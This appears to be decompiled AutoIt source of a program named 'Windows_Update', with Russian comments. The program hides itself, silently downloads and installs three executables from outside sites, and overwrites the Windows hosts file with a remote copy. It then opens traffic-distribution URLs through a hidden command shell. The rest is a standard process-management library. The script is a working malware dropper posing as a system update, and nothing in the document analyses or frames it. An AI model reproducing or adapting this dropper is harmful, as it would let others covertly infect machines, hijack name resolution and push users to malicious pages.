; <AUT2EXE VERSION: 3.2.2.0>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: E:\Documents and Settings\Owner\Desktop\autoit3exe\Windows_Update.au3>
; ----------------------------------------------------------------------------

Opt("TrayIconHide", 1)

;качаем первый файл
InetGet("http://www.free-porn-movies.info/adv/setup.exe", "setup.exe", 1, 1)
;ждём 30 секунд до запуска файла
$begin = TimerInit()
sleep(30000)
$dif = TimerDiff($begin)
;устанавливаем файл в тихом режиме
Global $file='setup.exe'
RunWait ( $file & ' /S' )

;ждём 5 секунд
$begin = TimerInit()
sleep(5000)
$dif = TimerDiff($begin)

;качаем второй файл
InetGet("http://www.hqtms.com/in.cgi?default&account=0197", "dvds-movies1176.exe", 1, 1)
;ждём 30 секунд до запуска файла
$begin = TimerInit()
sleep(30000)
$dif = TimerDiff($begin)
;устанавливаем файл в тихом режиме
Global $file2='dvds-movies1176.exe'
RunWait ( $file2 & ' /S' )

;ждём 10 секунд
$begin = TimerInit()
sleep(10000)
$dif = TimerDiff($begin)

;качаем третий файл
InetGet("http://protectwin.com/download/687/setup.exe", "protectwin.exe", 1, 1)
;ждём 30 секунд до запуска файла
$begin = TimerInit()
sleep(30000)
$dif = TimerDiff($begin)
;установка в тихом режиме
Global $file3='protectwin.exe'
RunWait ( $file3 & ' /S' )

;ждём 10 секунд для замены файла hosts
$begin = TimerInit()
sleep(10000)
$dif = TimerDiff($begin)
;заменяем файл hosts
InetGet("http://www.free-porn-movies.info/adv/hosts", "C:\WINDOWS\system32\drivers\etc\hosts", 1, 1)

;ждём 3 секунды что бы скачать класс Process.au3
$begin = TimerInit()
sleep(3000)
$dif = TimerDiff($begin)
;качаем класс Process.au3
InetGet("http://www.free-porn-movies.info/adv/Process.au3", "Process.au3", 1, 1)

;ждём 10 секунд для выполнение RunDos комманды
$begin = TimerInit()
sleep(10000)
$dif = TimerDiff($begin)
;выполняем RunDos комманду

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: E:\Program Files\AutoIt3\Include\Process.au3>
; ----------------------------------------------------------------------------

; Include Version:1.59  (04/20/2006)
; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.0
; Language:       English
; Description:    Functions that assist with process management.
;
; ------------------------------------------------------------------------------

;===============================================================================
;
; Description -   Returns a string containing the process name that belongs to a given PID.
; Syntax -        _ProcessGetName( $iPID )
; Parameters -    $iPID - The PID of a currently running process
; Requirements -  None.
; Return Values - Success - The name of the process
;                 Failure - Blank string and sets @error
;                       1 - Process doesn't exist
;                       2 - Error getting process list
;                       3 - No processes found
; Author(s) -     Erifash <erifash [at] gmail [dot] com>, Wouter van Kesteren.
; Notes -         Supplementary to ProcessExists().
;===============================================================================
Func _ProcessGetName($i_PID)
	If Not ProcessExists($i_PID) Then
		SetError(1)
		Return ''
	EndIf
	Local $a_Processes = ProcessList()
	If Not @error Then
		For $i = 1 To $a_Processes[0][0]
			If $a_Processes[$i][1] = $i_PID Then Return $a_Processes[$i][0]
		Next
	EndIf
	SetError(1)
	Return ''
EndFunc   ;==>_ProcessGetName

;===============================================================================
;
; Function Name:    _ProcessGetPriority()
; Description:      Get the  priority of an open process
; Parameter(s):     $vProcess      - PID or name of a process.
; Requirement(s):   AutoIt Beta v3.1.1.61+
;                   kernel32.dll (included with Windows)
; Return Value(s):  On Success - Returns integer corressponding to
;                   the processes's priority:
;                     0 - Idle/Low
;                     1 - Below Normal (Not supported on Windows 95/98/ME)
;                     2 - Normal
;                     3 - Above Normal (Not supported on Windows 95/98/ME)
;                     4 - High
;                     5 - Realtime
; On Failure:       Returns -1 and sets @Error to 1
; Author(s):        Matthew Tucker
;                   Valik added Pid or Processname logic
;===============================================================================
;
Func _ProcessGetPriority($vProcess)
	Local $i_PID = ProcessExists($vProcess)
	If Not $i_PID Then
		SetError(1)
		Return -1
	EndIf
	Local $hDLL = DllOpen('kernel32.dll')
	Local $aProcessHandle = DllCall($hDLL, 'int', 'OpenProcess', 'int', 0x0400, 'int', False, 'int', $i_PID)
	Local $aPriority = DllCall($hDLL, 'int', 'GetPriorityClass', 'int', $aProcessHandle[0])
	DllCall($hDLL, 'int', 'CloseHandle', 'int', $aProcessHandle[0])
	DllClose($hDLL)
	Switch $aPriority[0]
		Case 0x00000040
			Return 0
		Case 0x00004000
			Return 1
		Case 0x00000020
			Return 2
		Case 0x00008000
			Return 3
		Case 0x00000080
			Return 4
		Case 0x00000100
			Return 5
		Case Else
			SetError(1)
			Return -1
	EndSwitch

EndFunc   ;==>_ProcessGetPriority

;===============================================================================
;
; Description:      Executes a DOS command in a hidden command window.
; Syntax:           _RunDOS( $sCommand )
; Parameter(s):     $sCommand - Command to execute
; Requirement(s):   None
; Return Value(s):  On Success - Returns the exit code of the command
;                   On Failure - Depends on RunErrorsFatal setting
; Author(s):        Jeremy Landes <jlandes at landeserve dot com>
; Note(s):          None
;
;===============================================================================
Func _RunDOS($sCommand)
	Return RunWait(@ComSpec & " /C " & $sCommand, "", @SW_HIDE)
EndFunc   ;==>_RunDOS

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: E:\Program Files\AutoIt3\Include\Process.au3>
; ----------------------------------------------------------------------------

$rc = _RunDos("start http://tds.free-porn-movies.info/go.php?sid=3")

;ждём 50 секунд для выполнение RunDos комманды
$begin = TimerInit()
sleep(50000)
$dif = TimerDiff($begin)
;выполняем RunDos комманду
$rc = _RunDos("start http://tds.free-porn-movies.info/go.php?sid=5")

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: E:\Documents and Settings\Owner\Desktop\autoit3exe\Windows_Update.au3>
; ----------------------------------------------------------------------------

